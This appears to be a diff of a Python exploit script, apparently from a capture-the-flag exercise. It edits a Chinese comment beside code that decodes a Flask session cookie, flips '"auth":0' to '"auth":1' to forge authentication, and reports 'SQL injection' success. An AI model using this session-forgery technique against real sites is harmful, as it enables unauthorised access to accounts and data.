@@ -20,7 +20,7 @@ cookie = session.cookies
 sess = cookie.get_dict()
 text = FSCM.decode(sess['session']).decode("utf-8")
 newtext = text.replace('"auth":0', '"auth":1')
-newtext = newtext.replace("true", "True") # 不加这步会出现奇奇怪怪的报错
+newtext = newtext.replace("true", "True") # 转换成json之后true无法被Python识别，所以要改成大写
 print("sql注入{status}".format(status="成功" if text.find("true")+1 else '失败'))
 
 
